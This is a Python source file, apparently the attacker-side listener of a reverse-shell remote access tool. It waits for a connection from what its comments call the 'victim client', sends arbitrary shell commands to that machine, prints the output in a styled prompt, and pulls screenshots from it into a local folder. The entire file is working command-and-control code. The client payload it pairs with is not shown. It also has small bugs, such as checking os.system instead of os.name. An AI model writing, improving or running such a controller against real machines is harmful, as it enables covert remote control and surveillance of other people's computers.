# Execute this on our own machine and start listening 
import socket,sys,argparse,subprocess,os
from termcolor import colored
from datetime import datetime
import time
def get_args():
    parser=argparse.ArgumentParser()
    parser.add_argument('-p',help="Port on which listen to ",dest="port",default=1337,required=False,type=int)
    return parser.parse_args()


def beautify_terminal_take_command(whoami,cwd):
    """Beautifies the terminal and take commamnds and send to the main function"""
    print(colored(f"👤 {whoami} on ",'green',attrs=['bold']),end="")
    print(colored(f"📁 [{cwd}]",'blue',attrs=['dark']),end=" at ⏳ ")
    print(colored(f"[{datetime.now().strftime('%H:%M:%S')}]",'magenta'))
    print(colored("# ",'red'),end="")
    return input().strip()

def recieve_screenshot(client_con,):
    client_con.send("screenshot".encode())
                    
    screenshot_filename,cwd,whoami=client_con.recv(bufferSize).decode().split(Separator)
    
    screenshot_filename=os.path.basename(screenshot_filename)
    
    # buf=4096
    dir='Screenshots'
    if not os.path.exists(dir):
        os.mkdir(dir)
    with open(f'{dir}/{screenshot_filename}',"wb") as f:
        while True:
            bytes_read=client_con.recv(bufferSize)
            
            if not bytes_read:
                print("bhnchod")
                break
            f.write(bytes_read)
        print("hello")
    time.sleep(2)
    print("sleeping")
    results,cwd,whoami=client_con.recv(bufferSize).decode().split(Separator)
    return [results,cwd,whoami]
def send_commands(client_con):
    # before recieving and sending commands,we will accept current workking directory and the username of the victim client to make a terminal look good 
    cwd=client_con.recv(bufferSize).decode()
    whoami=client_con.recv(bufferSize).decode()
    if os.system=="nt":
        subprocess.run('cls')
    else:
        subprocess.run('clear')

    while True:
        try:
            cmd=beautify_terminal_take_command(whoami,cwd)
            if len(str.encode(cmd)) <= 0:
                continue
            if cmd=='screenshot':
                progress,cwd,whoami=recieve_screenshot(client_con)
            else:
                client_con.send(str.encode(cmd))
                # Recieve the response and why are we seaparting you may ask because we are sending togther varios data ! 
                results,cwd,whoami=client_con.recv(bufferSize).decode().split(Separator)
            if cmd.lower()=='quit':
                # conditon to break connection 
                break
            # printing only the results 
            print(colored(results,attrs=['dark']))
        except KeyboardInterrupt:
            client_con.send('quit'.encode())
            print("\nGood Bye !")
            break
            
            
        
def create_socket(host,port):
    # Creating the socket object 
    try:
        s=socket.socket()
        # Binding , combining the socket object with ip and port , it takes tuple as input 
        s.bind((host,port))
        
        # let's listen for incoming connections , what is 5 , means we will try for 5 times , means if a error occurs when victim connects to this , then it will listen for 5 faulty connections and will stop listening after that ! 
        s.listen(5)
        print("-"*50)
        print(colored(f"[+] Listening on {host}:{port}",'green',attrs=['bold']))
        print("-"*50)
        
        # After connection gets accepted , we  get a tuple with two elemets inside it , element at index 0 is the object through which we will do send commands and recieve output and at the other index , there is tuple with client ip and port ! 
        # It looks like this 
        # (<socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 1337), raddr=('127.0.0.1', 39968)>, ('127.0.0.1', 39968))
        client_con,client_info=s.accept()
        print(f'\n[+] Recieved a connection from {client_info[0]:{client_info[1]}}')
        
        # Sending commands to the host 
        send_commands(client_con)
        client_con.close()
        s.close()
    except socket.error as err:
        print(colored(f"[-] Error occured at socket processing, Reason {err}",'red'))
        
    # Listening on the port 
if __name__=="__main__":
    arguments=get_args()
    hostIp="0.0.0.0"
    bufferSize=4096 # for 128kb messages buffer 
    Separator= "<sep>"
    hostPort=arguments.port
    create_socket(hostIp,hostPort)